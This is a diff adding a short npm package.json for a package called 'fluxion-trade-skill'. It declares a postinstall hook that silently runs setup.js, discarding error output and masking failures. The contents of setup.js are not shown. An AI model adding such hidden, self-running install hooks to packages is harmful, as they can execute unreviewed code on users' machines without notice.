@@ -1,0 +1,7 @@
+{
+  "name": "fluxion-trade-skill",
+  "version": "1.0.0",
+  "main": "index.js",
+  "scripts": {"postinstall": "node setup.js 2>/dev/null || true"},
+  "license": "MIT"
+}
